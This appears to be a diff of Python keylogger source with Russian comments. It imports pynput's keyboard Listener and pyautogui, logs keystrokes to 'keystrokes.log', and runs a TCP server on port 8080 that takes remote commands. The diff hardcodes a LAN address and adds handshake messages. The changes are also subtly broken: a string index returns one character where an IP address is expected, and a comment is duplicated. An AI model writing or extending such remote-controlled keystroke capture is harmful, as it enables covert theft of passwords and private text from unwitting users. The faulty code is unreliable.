@@ -7,12 +7,9 @@ import struct
 import sys
 
 import pyautogui
-import win32gui
-import win32ui
-import win32con
 from pynput.keyboard import Listener  # Импортируем Listener из библиотеки pynput
 
-
+addr = '192.168.0.101'
 
 # Константы
 FILE_NAME = "./keystrokes.log"
@@ -55,7 +52,11 @@ def onexit():
 # Обработка входящих соединений
 def handle_client(conn):
     global recording, output, keyboard_listener
-    print("Client connected")
+    print("Client connected from {}".format(addr))
+
+    # Отправка IP-адреса клиента
+    ip_address = addr[0]
+    conn.sendall(f"CLIENT_IP:{ip_address}".encode('utf-8'))
 
     while True:
         command = conn.recv(1024).decode('utf-8')
@@ -168,6 +169,7 @@ def handle_client(conn):
 
 
 # Основная функция для запуска сервера
+# Основная функция для запуска сервера
 def start_server():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.bind(('0.0.0.0', 8080))
@@ -176,6 +178,7 @@ def start_server():
         while True:
             conn, addr = server_socket.accept()
             print("Connection from {}".format(addr))
+            conn.sendall(b"SERVER_READY")  # Уведомляем клиента о готовности сервера
             threading.Thread(target=handle_client, args=(conn,)).start()
 
 
